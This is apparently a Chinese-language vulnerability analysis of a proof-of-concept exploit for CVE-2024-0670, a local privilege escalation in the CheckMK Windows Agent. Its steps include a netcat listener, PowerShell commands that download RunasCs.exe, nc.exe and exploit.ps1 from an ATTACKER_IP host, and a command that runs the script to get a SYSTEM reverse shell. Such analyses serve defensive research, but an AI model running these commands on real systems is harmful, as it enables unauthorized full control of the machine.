## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危 (High)

**CVSS评分:** 未提供

**影响版本:** 未指定具体版本，影响所有存在此漏洞的CheckMK Windows Agent版本

**利用条件:** 低权限Windows用户、PowerShell启用、已安装CheckMK Windows Agent、能够下载文件、攻击者可控制HTTP服务器和Netcat监听器

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full Exploit)

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

本次分析的CVE-2024-0670 POC代码，旨在利用CheckMK Windows Agent中的一个本地权限提升漏洞。该漏洞的根本原因在于，CheckMK Agent在执行MSI修复（`MSI repair`）操作时，会从`C:\Windows\Temp\`目录执行文件。如果一个低权限的用户能够在此目录中放置具有可预测文件名的恶意可执行文件或脚本，并触发MSI修复过程，则可以以`NT AUTHORITY\SYSTEM`的最高权限执行这些文件，从而实现本地权限提升。

**POC有效性分析**

该POC是全面且易于理解的，提供了详细的利用说明和所有必要的组件。它包含三个主要部分：`RunasCs.exe`（一个定制的`runas`替代工具，支持明文密码，其C#源代码`RunasCs.cs`也部分提供）、`nc.exe`（Netcat，用于建立反向Shell）以及`exploit.ps1`（核心PowerShell脚本，负责协调整个利用过程）。README文件清晰地阐述了漏洞的摘要、受影响的厂商、CVE编号及相关的安全公告链接（`https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/`）。

POC的利用流程遵循了针对MSI安装程序漏洞的典型模式：攻击者首先在其控制的机器上搭建一个简易的HTTP服务器来托管恶意工具，并启动Netcat监听器以捕获反向Shell。然后，在目标Windows机器上，低权限用户通过PowerShell下载这些工具到`C:\Windows\Temp\`目录。最后，通过`RunasCs.exe`执行`exploit.ps1`脚本，该脚本负责在`C:\Windows\Temp\`中植入多个Payload文件，并触发CheckMK Agent的MSI修复过程。当MSI修复机制运行时，它将执行这些由攻击者预先放置的Payload文件，最终在攻击者机器上建立一个具有`NT AUTHORITY\SYSTEM`权限的反向Shell。整个流程设计合理，逻辑清晰，所需文件一应俱全，因此该POC在概念验证和实际利用方面具有高度的有效性。

**利用步骤**

1.  **环境准备**: 确保目标Windows机器已安装CheckMK Windows Agent，并存在一个低权限的用户账户，且PowerShell已启用。攻击者机器需安装Python（用于简易HTTP服务器）和Netcat（用于监听）。
2.  **设置攻击者HTTP服务器**: 将POC提供的`RunasCs.exe`、`nc.exe`和`exploit.ps1`文件放置在攻击者机器的某个目录下，并在此目录启动一个简单的Python HTTP服务器（例如，运行`python -m http.server 8000`）。
3.  **启动Netcat监听器**: 在攻击者机器上打开一个新的终端，启动Netcat监听器以接收反向Shell。例如：`nc -lvnp 1111`（端口`1111`可根据需要更改）。
4.  **在目标机器下载工具**: 作为低权限用户，在目标Windows机器上执行以下PowerShell命令，将攻击工具从攻击者HTTP服务器下载到`C:\Windows\Temp\`目录：
    ```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
    ```
    请将`ATTACKER_IP`替换为攻击者机器的实际IP地址。
5.  **执行漏洞利用**: 在目标机器上，使用`RunasCs.exe`（以当前低权限用户身份）执行下载的`exploit.ps1`脚本，这将触发MSI修复过程并最终实现提权：
    ```powershell
.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
    ```
    请注意，此处的`username`和`password`是当前低权限用户的凭据，`RunasCs.exe`在此处的功能是确保`exploit.ps1`能够被正确调用执行，实际的权限提升逻辑由`exploit.ps1`和MSI修复机制协同完成。
6.  **接收SYSTEM Shell**: 如果利用成功，攻击者机器上启动的Netcat监听器将收到一个具有`NT AUTHORITY\SYSTEM`权限的反向Shell。

**投毒风险分析**

对CVE-2024-0670的POC代码进行分析后，其投毒风险评估为15%，属于较低风险。此评估基于对POC代码的透明度、依赖项以及其既定功能的审查。

该POC的文档（README）非常清晰，明确指出了其目的是演示CheckMK Windows Agent中的本地权限提升漏洞。这种开放性和详细的说明降低了代码中隐藏未知恶意功能的可能性。POC的核心组件包括：

1.  **`exploit.ps1`**: 这是一个PowerShell脚本，负责编排整个攻击流程，包括从攻击者控制的HTTP服务器下载文件、在目标系统的临时目录中放置Payload，以及触发MSI修复过程。PowerShell脚本通常以纯文本形式存在，这使得它们相对容易被审计和检查是否存在恶意代码或混淆。从README的描述来看，该脚本的逻辑完全集中于实现漏洞利用，没有迹象表明存在额外的、未声明的恶意行为，例如与未知C2服务器通信或执行超出提权范围的系统修改。

2.  **`RunasCs.exe` (及其源代码`RunasCs.cs`)**: `RunasCs.exe`是一个自定义的`runas`工具替代品，其C#源代码`RunasCs.cs`也部分提供。提供源代码显著增强了代码的透明度，允许安全研究人员审查其内部工作机制，以确保其功能仅限于作为辅助工具执行命令，而非包含恶意Payload。尽管输入中`RunasCs.cs`的代码是截断的，但从可用部分看，它并未显示出任何不属于其声明功能的恶意行为特征。

3.  **`nc.exe`**: 这是Netcat的Windows版本，一个众所周知的网络工具。在渗透测试和漏洞利用场景中，`nc.exe`常被用作建立反向Shell的工具，以在目标系统上获得远程访问。它本身并非恶意软件，但在攻击中充当 Payload 传递者。POC中其用途被明确声明为建立`SYSTEM`权限的反向Shell，与漏洞利用的目标完全一致。

**投毒风险的主要考量点**：

*   **外部二进制文件依赖**: POC的利用过程需要从攻击者控制的HTTP服务器下载`RunasCs.exe`和`nc.exe`。尽管在漏洞复现场景中这是常见的做法，但如果POC的托管平台（例如GitHub仓库）遭到攻击并被恶意行为者篡改，或者POC的原始作者本身就具有恶意意图，那么下载的文件可能会被替换为真正的恶意软件（例如，包含后门、Rootkit或勒索软件）。因此，即使POC代码本身干净，对下载的外部二进制文件仍需保持警惕，并建议通过哈希校验、病毒扫描和沙箱分析来验证其完整性和安全性。
*   **代码篡改可能性**: 任何公开的POC代码都存在被第三方恶意篡改的风险。尽管当前的POC代码看起来是良性的，但在实际部署和使用前，建议对所有脚本和可执行文件的完整内容进行彻底的静态和动态分析，以确保没有隐藏的恶意功能、混淆代码或与预期功能无关的网络请求。

总而言之，该POC的透明度较高，其组件和操作逻辑均符合其声明的本地权限提升目的。15%的投毒风险主要反映了从外部下载二进制文件的固有风险以及任何公开代码都可能面临的潜在篡改风险。对于防御性安全研究，始终建议在受控和隔离的环境中对所有POC进行严格审查和测试。

**项目地址:** 未指定POC项目地址，POC代码为本地文件

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
